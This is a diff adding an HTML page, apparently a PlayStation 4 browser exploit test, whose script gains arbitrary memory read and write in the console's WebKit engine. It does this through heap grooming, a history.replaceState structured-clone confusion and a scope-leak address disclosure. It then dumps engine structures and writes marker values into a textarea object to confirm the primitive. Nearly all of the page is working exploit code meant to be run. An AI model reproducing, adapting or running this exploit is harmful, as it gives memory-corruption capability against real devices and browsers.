@@ -1,0 +1,554 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>PS4 Write Test</title></head>
+<body>
+<button id="go">GO</button>
+<div id="timer">—</div>
+<pre id="log"></pre>
+<script>
+"use strict";
+const L=document.getElementById("log");
+const T=document.getElementById("timer");
+const btnGo=document.getElementById("go");
+
+let fullLog="";
+function log(s){
+    fullLog += s+"\n";
+    L.textContent = fullLog;
+    L.scrollTop = L.scrollHeight;
+    console.log(s);
+}
+function hex(v){return "0x"+(typeof v==="number"?v.toString(16):String(v));}
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+window.addEventListener("unhandledrejection", ev => {
+  log("[!] unhandledRejection: " + ((ev.reason && ev.reason.message) || ev.reason));
+});
+window.addEventListener("error", ev => {
+  log("[!] error: " + ((ev.error && ev.error.message) || ev.message));
+});
+
+// ============ TIMER ============
+let countdownInterval=null;
+let countdownRemaining=60;
+const READ_DELAY_SECONDS = 60;
+
+function startReadDelay(){
+    if(countdownInterval) return;
+    countdownRemaining = READ_DELAY_SECONDS;
+    T.textContent = "Read time: " + countdownRemaining + "s";
+    log("");
+    log("=== READ TIME " + READ_DELAY_SECONDS + "s BEFORE AUTO-LOGOUT ===");
+    countdownInterval = setInterval(()=>{
+        countdownRemaining--;
+        T.textContent = "Read time: " + countdownRemaining + "s";
+        if(countdownRemaining<=0){
+            clearInterval(countdownInterval);
+            countdownInterval=null;
+            startCountdown();
+        }
+    },1000);
+}
+function startCountdown(){
+    if(countdownInterval) return;
+    countdownRemaining = 60;
+    T.textContent = countdownRemaining + "s to auto-logout";
+    log("");
+    log("=== AUTO-LOGOUT IN 60s ===");
+    countdownInterval = setInterval(()=>{
+        countdownRemaining--;
+        T.textContent = countdownRemaining + "s to auto-logout";
+        if(countdownRemaining<=0){
+            clearInterval(countdownInterval);
+            countdownInterval=null;
+            doLogout();
+        }
+    },1000);
+}
+function doLogout(){
+    if(countdownInterval){ clearInterval(countdownInterval); countdownInterval=null; }
+    T.textContent = "Logged out";
+    log("");
+    log("=== LOG OUT ===");
+    log("Session cleared at " + new Date().toLocaleTimeString());
+    log("Close browser + restart PS4.");
+    try{sessionStorage.clear();}catch(e){}
+    try{localStorage.clear();}catch(e){}
+    btnGo.disabled=true;
+}
+
+// ============ Int64 / constants ============
+class Int64{
+    constructor(l,h){this.low=l>>>0;this.hi=h>>>0;}
+    add32(x){const nl=(this.low+x)>>>0;const c=(nl<this.low)?1:0;return new Int64(nl,(this.hi+c)>>>0);}
+    sub32(x){const nl=(this.low-x)>>>0;const b=(nl>this.low)?1:0;return new Int64(nl,(this.hi-b)>>>0);}
+    toString(){return this.hi.toString(16).padStart(8,"0")+this.low.toString(16).padStart(8,"0");}
+}
+window.int64=Int64;
+
+const CARRIER_SLOTS=9000000;
+const DRAIN_COUNT=512,K=2,DUPLICATE_INDEX=2,CONTROL_INDEX=0xffff,CONTROL_INT=-64000;
+const FILLER_BIGINTS=K-1,FILLER_OBJECTS=0xfffe-K,EXPECTED_LENGTH=0x50001;
+const CELL_BYTES=0x30,FUNCTION_BYTES=0x20,NATIVE_EXECUTABLE_BYTES=0x38,HOLDER_BYTES=0x40;
+const CAPTURE_DELAY_MS=50,COMPOSE_DELAY_MS=100;
+const DRAIN_SIZE=0x10000,SLAB_SIZE=0x400000;
+const BUTTERFLY_HOLE_SIZE=0x81000,SEPARATOR_SIZE=0x10000;
+const EARLY_HOLE_SIZE=0x70000,GUARD_SIZE=0x90000;
+const PREDECESSOR_SIZE=0x80000,FINAL_HOLE_SIZE=0x80000;
+const RW_BUFFER_SIZE=0x100,IDENT_OFFSET=0x20;
+const symbolToString=Symbol.prototype.toString;
+const identityMagic=new Uint8Array([0x5a,0xa5,0xc3,0x3c,0xde,0xad,0xbe,0xef]);
+
+const rwHeader=new Uint8Array(CELL_BYTES);
+const targetHeader=new Uint8Array(NATIVE_EXECUTABLE_BYTES);
+const holderHeader=new Uint8Array(HOLDER_BYTES);
+const scratchBits=new ArrayBuffer(8);
+const scratchBytes=new Uint8Array(scratchBits);
+const scratchWords=new Uint32Array(scratchBits);
+const scratchDouble=new Float64Array(scratchBits);
+
+let attemptNumber=0,keepIndex=0,stopped=false,keepAlive=null;
+let onEvent=null,criticalBarrier=null;
+let settleResolve=null,settleReject=null,running=false;
+let referenceTarget=null,rwBuffer=null,rwView=null,rwMirror=null;
+let targetBuffer=null,targetView=null;
+const nativeTarget=parseInt;
+let fakeHost=null,lengthWord=null,anchorElement=null;
+let markerObjectA=null,markerObjectB=null;
+let targetHolder=null,holderGuardA=null,holderGuardB=null;
+let fillerGraph=null,outerGraph=null;
+let leakedScope=null,getterCarrier=null,preparedSymbolObject=null;
+let capturedString=null,capturedWords=null;
+let copiedLength=0,captureState=0,captureError=null;
+let hostAddress=NaN,fakeAddress=NaN;
+let predecessorWords=null,pointerLow=0,pointerHigh=0;
+let targetAddress=NaN;
+let nativeTargetAddress=NaN,anchorElementAddress=NaN;
+let markerAAddress=NaN,markerBAddress=NaN,rwOriginalVector=NaN;
+let rwHeaderOK=false,holderHeaderOK=false;
+let functionStructureID=0,executableAddress=NaN,nativeConstructorAddress=NaN;
+let candidateEverReturned=false,candidateMutationStarted=false;
+let compositionState=0,compositionLength=0,compositionError=null;
+let liveCandidate=null,fakeReleased=false;
+
+function buffer(s){return new ArrayBuffer(s);}
+function uint32At(b,o){return b[o]+b[o+1]*0x100+b[o+2]*0x10000+b[o+3]*0x1000000;}
+function low48At(b,o){return b[o]+b[o+1]*0x100+b[o+2]*0x10000+b[o+3]*0x1000000+b[o+4]*0x100000000+b[o+5]*0x10000000000;}
+function readBytes(d,s,n){for(let i=0;i<n;++i)d[i]=s[i];}
+function sameBytes(l,r,n){for(let i=0;i<n;++i)if(l[i]!==r[i])return false;return true;}
+function readTwiceMatches(d,s,n){readBytes(d,s,n);return sameBytes(d,s,n);}
+function aimCarrier(c,a){const h=Math.floor(a/0x100000000);scratchWords[0]=a-h*0x100000000;scratchWords[1]=h;for(let i=0;i<8;++i)c[0x10+i]=scratchBytes[i];}
+function restoreCarrier(c){for(let i=0;i<8;++i)c[0x10+i]=rwHeader[0x10+i];}
+function ptrFromWords(w,o){if(w[o+3]!==0)return NaN;return w[o]+w[o+1]*0x10000+w[o+2]*0x100000000;}
+function plausibleCell(v){return v>0x100000000&&v<=0xffffffffffff&&v<=9007199254740991&&Math.floor(v)===v&&v%8===0;}
+function plausibleAddr(v){return v>0x100000000&&v<=0xffffffffffff&&v<=9007199254740991&&Math.floor(v)===v;}
+function encodedHeaderNumber(){const r=new ArrayBuffer(8);const u=new Uint32Array(r);const f=new Float64Array(r);u[0]=0x00004250;u[1]=0x01062800;return f[0];}
+function emit(t,d){if(onEvent===null)return;try{onEvent(t,d===undefined?"":String(d));}catch(e){}}
+
+function giveUp(r){
+    stopped=true;
+    emit("GIVE-UP", r + " | cap=" + captureState + " comp=" + compositionState);
+    const rj=settleReject;
+    settleResolve=null;settleReject=null;running=false;
+    if(rj!==null)rj(new Error(r));
+}
+function releaseAll(){
+    referenceTarget=null;rwBuffer=null;rwView=null;rwMirror=null;targetBuffer=null;targetView=null;
+    fakeHost=null;lengthWord=null;anchorElement=null;markerObjectA=null;markerObjectB=null;
+    targetHolder=null;holderGuardA=null;holderGuardB=null;fillerGraph=null;outerGraph=null;
+    leakedScope=null;getterCarrier=null;preparedSymbolObject=null;capturedString=null;capturedWords=null;
+    predecessorWords=null;keepAlive=null;
+    if(typeof globalThis.gc==="function"){try{globalThis.gc();}catch(e){}}
+}
+function startAttempt(){
+    if(fakeReleased||stopped)return;
+    releaseAll();
+    copiedLength=0;captureState=0;captureError=null;hostAddress=NaN;fakeAddress=NaN;
+    keepAlive=new Array(DRAIN_COUNT+3);keepIndex=0;
+    pointerLow=0;pointerHigh=0;targetAddress=NaN;
+    nativeTargetAddress=NaN;anchorElementAddress=NaN;markerAAddress=NaN;markerBAddress=NaN;rwOriginalVector=NaN;
+    rwHeaderOK=false;holderHeaderOK=false;
+    functionStructureID=0;executableAddress=NaN;nativeConstructorAddress=NaN;
+    candidateEverReturned=false;candidateMutationStarted=false;
+    compositionState=0;compositionLength=0;compositionError=null;liveCandidate=null;
+    emit("START","attempt="+attemptNumber);
+    try{
+        buildAndStoreGraph();
+        for(let i=0;i<8;++i)rwView[IDENT_OFFSET+i]=identityMagic[i];
+        prepareAddrof();
+    }catch(e){
+        emit("ERR",(e?.name||"?")+":"+String(e?.message).slice(0,80));
+        giveUp("setup-threw:"+((e&&e.message)||e));
+    }
+}
+function leakScopeObject(){class Leaker{leak(){return super.foo;}}Leaker.prototype.__proto__=new Proxy({},{get:function(t,p,r){return r;}});const l=Leaker.prototype.leak;return (function(){return l();})();}
+function prepareSymbolWrapper(F){
+    leakedScope=leakScopeObject();
+    if(!leakedScope)throw new Error("scope-not-leaked");
+    for(let i=0;i<512;i++)leakedScope["p"+i]=i;
+    for(let j=0;j<8;j++)leakedScope[j]=1.1*j;
+    Object.defineProperty(leakedScope,"g",{get:F,configurable:true});
+    return Object(leakedScope.g);
+}
+function buildFakeHost(){
+    rwBuffer=new ArrayBuffer(RW_BUFFER_SIZE);
+    rwView=new Uint8Array(rwBuffer);
+    rwMirror=new Uint8Array(rwBuffer);
+    rwMirror[0]=0x3c;
+    targetBuffer=new ArrayBuffer(0x20);
+    targetView=new Uint8Array(targetBuffer);
+    targetView[0]=0xa5;
+    lengthWord={keep:0x51515151};
+    fakeHost={q0:encodedHeaderNumber(),q1:1.1,q2:rwView,q3:lengthWord,q4:2.2,q5:3.3};
+    delete fakeHost.q1;delete fakeHost.q4;delete fakeHost.q5;
+    if(!Number.isFinite(fakeHost.q0)||fakeHost.q2!==rwView||fakeHost.q3!==lengthWord||rwView[0]!==0x3c||targetView[0]!==0xa5||typeof nativeTarget!=="function")throw new Error("fake-host");
+    anchorElement=document.createElement("textarea");
+    markerObjectA={marker:0x4d41524b};
+    markerObjectB={marker:0x4d41524c};
+    holderGuardA={marker:0x484f4c44};
+    holderGuardB={marker:0x47554152};
+    targetHolder={q0:nativeTarget,q1:anchorElement,q2:markerObjectA,q3:markerObjectB,q4:holderGuardA,q5:holderGuardB};
+}
+function buildAndStoreGraph(){
+    referenceTarget={marker:0x51515151};
+    buildFakeHost();
+    fillerGraph=new Array(0xfffd);
+    let pos=0;const huge=1n<<40n;
+    for(let b=0;b<FILLER_BIGINTS;++b)fillerGraph[pos++]=huge+BigInt(b);
+    for(let o=0;o<FILLER_OBJECTS;++o)fillerGraph[pos++]={};
+    outerGraph=new Array(CONTROL_INDEX+1);
+    outerGraph[0]=fillerGraph;outerGraph[1]=referenceTarget;outerGraph[2]=referenceTarget;outerGraph[CONTROL_INDEX]=CONTROL_INT;
+    emit("REPLACESTATE","len="+outerGraph.length);
+    history.replaceState(outerGraph,"");
+    emit("REPLACESTATE","ok");
+}
+function prepareAddrof(){
+    capturedWords=new Uint16Array(16);
+    getterCarrier=function getterCarrierFunction(){return 7;};
+    getterCarrier[0]=fakeHost;
+    for(let i=1;i<CARRIER_SLOTS;i++)getterCarrier[i]=0;
+    getterCarrier[1]=targetHolder;getterCarrier[2]=fakeHost;getterCarrier[3]=targetHolder;
+    preparedSymbolObject=prepareSymbolWrapper(getterCarrier);
+    setTimeout(runAddrofCapture,CAPTURE_DELAY_MS);
+    setTimeout(beginComposition,COMPOSE_DELAY_MS);
+}
+function runAddrofCapture(){
+    try{
+        capturedString=symbolToString.call(preparedSymbolObject);
+        copiedLength=capturedString.length;
+        for(let i=0;i<16;i++)capturedWords[i]=capturedString.charCodeAt(7+i);
+        captureState=1;
+        emit("ADDROF","len="+copiedLength);
+    }catch(e){captureError=e;captureState=-1;emit("ADDROF-ERR",(e&&e.message)||e);}
+}
+function fillRawCellPointers(backing,pointer){
+    pointerHigh=Math.floor(pointer/0x100000000);
+    pointerLow=pointer-pointerHigh*0x100000000;
+    if(!plausibleCell(pointer))throw new Error("invalid-fake");
+    predecessorWords=new Uint32Array(backing);
+    for(let i=0;i<predecessorWords.length;i+=2){predecessorWords[i]=pointerLow;predecessorWords[i+1]=pointerHigh;}
+}
+function clearPredecessor(){if(predecessorWords!==null)predecessorWords.fill(0);}
+
+function loadHistoryCritical(){
+    let result=null,candidate=null;
+    try{
+        result=history.state;
+        if(!result){compositionState=0;emit("LOAD","no-state");return;}
+        compositionLength=result.length;
+        if(compositionLength!==EXPECTED_LENGTH){
+            try{result[DUPLICATE_INDEX]=undefined;}catch(e){}
+            result=null;clearPredecessor();compositionState=3;
+            emit("LOAD","len-mismatch got="+compositionLength+" exp="+EXPECTED_LENGTH);
+            return;
+        }
+        if(result[1]===result[DUPLICATE_INDEX]){
+            try{result[DUPLICATE_INDEX]=undefined;}catch(e){}
+            candidate=null;result=null;clearPredecessor();compositionState=2;
+            emit("LOAD","clone-miss");
+            return;
+        }
+        candidate=result[DUPLICATE_INDEX];
+        candidateEverReturned=true;
+        try{result[DUPLICATE_INDEX]=undefined;}catch(e){}
+        result=null;
+        readBytes(rwHeader,candidate,CELL_BYTES);
+        rwOriginalVector=low48At(rwHeader,0x10);
+        rwHeaderOK = rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0;
+        if(!rwHeaderOK){
+            candidate=null;clearPredecessor();compositionState=3;
+            emit("LOAD","rw-header-bad vec="+rwOriginalVector.toString(16));
+            return;
+        }
+        for(let i=0;i<8;++i)scratchBytes[i]=rwHeader[i];
+        if(scratchBytes[6]>=2)scratchBytes[6]-=2;
+        else{scratchBytes[6]=(scratchBytes[6]+0x100-2)&0xff;scratchBytes[7]=(scratchBytes[7]-1)&0xff;}
+        const upg=scratchDouble[0];
+        if(!(upg===upg&&isFinite(upg))){
+            candidate=null;clearPredecessor();compositionState=3;
+            emit("LOAD","upg-not-finite");
+            return;
+        }
+        candidateMutationStarted=true;
+        fakeHost.q0=upg;
+        aimCarrier(candidate,targetAddress);
+        readTwiceMatches(holderHeader,rwView,HOLDER_BYTES);
+        nativeTargetAddress=low48At(holderHeader,0x10);
+        anchorElementAddress=low48At(holderHeader,0x18);
+        markerAAddress=low48At(holderHeader,0x20);
+        markerBAddress=low48At(holderHeader,0x28);
+        holderHeaderOK = plausibleCell(nativeTargetAddress) && plausibleCell(anchorElementAddress) &&
+                         plausibleCell(markerAAddress) && plausibleCell(markerBAddress);
+        if(!holderHeaderOK){
+            restoreCarrier(candidate);candidate=null;clearPredecessor();compositionState=3;
+            emit("LOAD","holder-header-bad");
+            return;
+        }
+        aimCarrier(candidate, nativeTargetAddress);
+        readBytes(targetHeader, rwView, FUNCTION_BYTES);
+        functionStructureID=uint32At(targetHeader,0);
+        executableAddress=low48At(targetHeader,0x18);
+        if (plausibleCell(executableAddress)) {
+            aimCarrier(candidate, executableAddress);
+            readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
+            nativeConstructorAddress=low48At(targetHeader,0x30);
+            try{globalThis.__ps4NativeCtor = nativeConstructorAddress;}catch(e){}
+        }
+        restoreCarrier(candidate);
+        liveCandidate=candidate;candidate=null;clearPredecessor();
+        compositionState=1;
+        emit("LOAD","ok");
+    }catch(e){
+        if(candidate!==null){try{restoreCarrier(candidate);}catch(x){}}
+        candidate=null;result=null;try{clearPredecessor();}catch(x){}
+        compositionError=e;compositionState=-1;
+        emit("LOAD-ERR",(e&&e.message)||e);
+    }
+}
+function runGroomAndLoad(){
+    try{
+        const ch=new MessageChannel();ch.port1.close();ch.port2.close();
+        for(let i=0;i<DRAIN_COUNT;++i)keepAlive[keepIndex++]=buffer(DRAIN_SIZE);
+        let slab=buffer(SLAB_SIZE);ch.port1.postMessage(0,[slab]);slab=null;
+        const bh1=buffer(BUTTERFLY_HOLE_SIZE),bh2=buffer(BUTTERFLY_HOLE_SIZE);
+        const sep=buffer(SEPARATOR_SIZE),eh=buffer(EARLY_HOLE_SIZE);
+        const grd=buffer(GUARD_SIZE),pred=buffer(PREDECESSOR_SIZE),fh=buffer(FINAL_HOLE_SIZE);
+        fillRawCellPointers(pred,fakeAddress);
+        keepAlive[keepIndex++]=sep;keepAlive[keepIndex++]=grd;keepAlive[keepIndex++]=pred;
+        criticalBarrier(fakeAddress,targetAddress);
+        ch.port1.postMessage(0,[bh1,bh2,eh,fh]);
+        loadHistoryCritical();
+    }catch(e){try{clearPredecessor();}catch(x){}compositionError=e;compositionState=-1;emit("GROOM-ERR",(e&&e.message)||e);}
+    reportComposition();
+}
+let barrierNode=null;
+function ensureBarrierNode(){if(barrierNode!==null)return;try{barrierNode=document.createElement("div");barrierNode.style.cssText="position:absolute;left:-9999px;top:0";document.body.appendChild(barrierNode);}catch(e){barrierNode=null;}}
+function defaultCriticalBarrier(f,t){try{const l="X="+f+"-"+t;if(barrierNode!==null){barrierNode.textContent=l;void barrierNode.offsetWidth;}void new Blob([l],{type:"text/plain"});}catch(e){}}
+function beginComposition(){
+    if(captureState===0){giveUp("no-addrof");return;}
+    if(captureState<0){giveUp("addrof-threw");return;}
+    const a0=ptrFromWords(capturedWords,0);
+    const b0=ptrFromWords(capturedWords,4);
+    const a1=ptrFromWords(capturedWords,8);
+    const b1=ptrFromWords(capturedWords,12);
+    const rep=a0===a1&&b0===b1;
+    const dis=a0!==b0;
+    const pl=plausibleCell(a0)&&plausibleCell(b0)&&plausibleCell(a1)&&plausibleCell(b1);
+    emit("PTRS","host="+hex(a0)+" target="+hex(b0)+" rep="+rep+" dis="+dis+" pl="+pl);
+    if(!(rep&&dis&&pl)){giveUp("addrof-validation");return;}
+    hostAddress=a0;targetAddress=b0;
+    fakeAddress=hostAddress+0x10;
+    if(!plausibleCell(fakeAddress)){giveUp("fake-addr");return;}
+    runGroomAndLoad();
+}
+function reportComposition(){
+    emit("COMPOSE","state="+compositionState+" len="+compositionLength);
+    if(compositionState<0){giveUp("load-threw");return;}
+    if(compositionState===2){giveUp("clone-miss");return;}
+    if(compositionState===3){giveUp("validation");return;}
+    if(compositionState===0){giveUp("no-result");return;}
+    try{history.replaceState(null,"");}catch(e){}
+    stopped=true;running=false;
+    const res=settleResolve;settleResolve=null;settleReject=null;
+    if(res!==null)res(buildCarrier());
+}
+function buildCarrier(){
+    return {
+        aim(a){if(liveCandidate===null)throw new Error("dead");if(!plausibleAddr(a))throw new RangeError("impl");aimCarrier(liveCandidate,a);},
+        restore(){if(liveCandidate)restoreCarrier(liveCandidate);},
+        get view(){return rwView;},
+        windowBytes:RW_BUFFER_SIZE,
+        holderAddress:targetAddress,
+        anchorObjectAddress:markerAAddress,
+        textareaAddress:anchorElementAddress,
+        nativeTargetAddress,executableAddress,nativeConstructorAddress,
+        hostAddress,fakeAddress
+    };
+}
+function establishPrimitive(options){
+    const opts=options||{};
+    if(fakeReleased)return Promise.reject(new Error("fake-released"));
+    if(running)return Promise.reject(new Error("already-running"));
+    if(typeof BigInt!=="function"||typeof MessageChannel!=="function"||typeof Symbol!=="function"||typeof history==="undefined"||typeof history.replaceState!=="function")return Promise.reject(new Error("unsupported"));
+    onEvent=typeof opts.onEvent==="function"?opts.onEvent:null;
+    criticalBarrier=typeof opts.beforeCriticalLoad==="function"?opts.beforeCriticalLoad:defaultCriticalBarrier;
+    if(criticalBarrier===defaultCriticalBarrier)ensureBarrierNode();
+    running=true;stopped=false;attemptNumber=1;
+    return new Promise((resolve,reject)=>{
+        settleResolve=resolve;settleReject=reject;startAttempt();
+        setTimeout(()=>{
+            if(running && settleReject!==null){
+                const rj=settleReject;settleResolve=null;settleReject=null;running=false;
+                rj(new Error("timeout | cap="+captureState+" comp="+compositionState));
+            }
+        }, 15000);
+    });
+}
+
+// ============ helpers ============
+function readQ(C, addr) {
+    C.aim(addr);
+    let v = 0n;
+    for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(C.view[i]);
+    C.restore();
+    return v;
+}
+function writeQ(C, addr, val) {
+    val &= 0xFFFFFFFFFFFFFFFFn;
+    C.aim(addr);
+    for (let i = 0; i < 8; i++) C.view[i] = Number((val >> BigInt(i*8)) & 0xFFn);
+    C.restore();
+}
+function dumpStruct(C, name, addr, len) {
+    log("");
+    log("=== " + name + " @ " + hex(addr) + " ===");
+    try {
+        C.aim(addr);
+        for (let row = 0; row < len/16; row++) {
+            let hexs = "", asc = "";
+            for (let j = 0; j < 16; j++) {
+                const b = C.view[row*16 + j];
+                hexs += b.toString(16).padStart(2,"0") + " ";
+                asc += (b >= 32 && b <= 126) ? String.fromCharCode(b) : ".";
+            }
+            log("+" + (row*16).toString(16).padStart(3,"0") + " " + hexs + "|" + asc + "|");
+        }
+        C.restore();
+    } catch(e) { log("  err: " + e.message); }
+}
+
+// ============ GO ============
+btnGo.addEventListener("click", async () => {
+    btnGo.disabled = true;
+    log("=== PS4 Write Test (single 8-byte @ TEXTAREA+0xC0) ===");
+    log("");
+
+    let C = null;
+    try {
+        C = await establishPrimitive({
+            onEvent: (t,d) => log("   [" + t + "] " + d)
+        });
+    } catch (e) {
+        log("[-] FAILED: " + e.message);
+        log("");
+        log("=== SOLUTION ===");
+        log("1. Close browser completely");
+        log("2. Restart PS4");
+        log("3. Open browser ONLY");
+        log("4. Click GO once");
+        startReadDelay();
+        return;
+    }
+
+    log("[+] R/W OK");
+    log("    host     = " + hex(C.hostAddress));
+    log("    target   = " + hex(C.holderAddress));
+    log("    anchor   = " + hex(C.anchorObjectAddress));
+    log("    textarea = " + hex(C.textareaAddress));
+    log("    ctor     = " + hex(globalThis.__ps4NativeCtor || 0));
+    log("");
+
+    // ===== DUMPS =====
+    dumpStruct(C, "HOST",        C.hostAddress,         0x100);
+    dumpStruct(C, "ANCHOR",      C.anchorObjectAddress, 0x100);
+    dumpStruct(C, "TEXTAREA",    C.textareaAddress,     0x100);
+
+    if (Number.isFinite(C.nativeTargetAddress) && C.nativeTargetAddress > 0)
+        dumpStruct(C, "NATIVE TARGET", C.nativeTargetAddress, 0x80);
+
+    if (Number.isFinite(C.executableAddress) && C.executableAddress > 0)
+        dumpStruct(C, "EXECUTABLE", C.executableAddress, 0x80);
+
+    if (Number.isFinite(globalThis.__ps4NativeCtor) && globalThis.__ps4NativeCtor > 0)
+        dumpStruct(C, "CTOR", globalThis.__ps4NativeCtor, 0x80);
+
+    // =====================================================
+    //  SINGLE WRITE TEST @ TEXTAREA + 0xC0
+    // =====================================================
+    log("");
+    log("========================================");
+    log("  WRITE TEST @ TEXTAREA + 0xC0");
+    log("  value: 0xDEADBEEFDEADBEEF");
+    log("========================================");
+
+    const TEST_ADDR = C.textareaAddress + 0xC0;
+    const TEST_VAL  = 0xDEADBEEFDEADBEEFn;
+
+    const before = readQ(C, TEST_ADDR);
+    log("  addr    = " + hex(TEST_ADDR));
+    log("  BEFORE  = 0x" + before.toString(16).padStart(16,"0"));
+
+    writeQ(C, TEST_ADDR, TEST_VAL);
+    log("  WROTE   = 0x" + TEST_VAL.toString(16).padStart(16,"0"));
+
+    const after = readQ(C, TEST_ADDR);
+    log("  AFTER   = 0x" + after.toString(16).padStart(16,"0"));
+
+    if (after === TEST_VAL) {
+        log("  RESULT  = OK  (write primitive works!)");
+    } else {
+        log("  RESULT  = FAIL  (readback mismatch)");
+    }
+
+    // re-dump TEXTAREA to see the effect
+    dumpStruct(C, "TEXTAREA AFTER WRITE @ +0xC0", C.textareaAddress, 0x100);
+
+    // =====================================================
+    //  SECOND TEST @ TEXTAREA + 0xD0
+    // =====================================================
+    log("");
+    log("========================================");
+    log("  SECOND WRITE @ TEXTAREA + 0xD0");
+    log("  value: 0xCAFEBABECAFEBABE");
+    log("========================================");
+
+    const TEST_ADDR2 = C.textareaAddress + 0xD0;
+    const TEST_VAL2  = 0xCAFEBABECAFEBABEn;
+
+    const before2 = readQ(C, TEST_ADDR2);
+    log("  addr    = " + hex(TEST_ADDR2));
+    log("  BEFORE  = 0x" + before2.toString(16).padStart(16,"0"));
+
+    writeQ(C, TEST_ADDR2, TEST_VAL2);
+    log("  WROTE   = 0x" + TEST_VAL2.toString(16).padStart(16,"0"));
+
+    const after2 = readQ(C, TEST_ADDR2);
+    log("  AFTER   = 0x" + after2.toString(16).padStart(16,"0"));
+
+    if (after2 === TEST_VAL2) {
+        log("  RESULT  = OK");
+    } else {
+        log("  RESULT  = FAIL");
+    }
+
+    // Final dump
+    dumpStruct(C, "TEXTAREA FINAL", C.textareaAddress, 0x100);
+
+    log("");
+    log(">>> 60s قراءة، وبعدها 60s قبل auto-logout");
+    log(">>> لو الـ PS4 استحمل ومافيش crash — الـ primitive سليم");
+
+    startReadDelay();
+});
+</script>
+</body>
+</html>
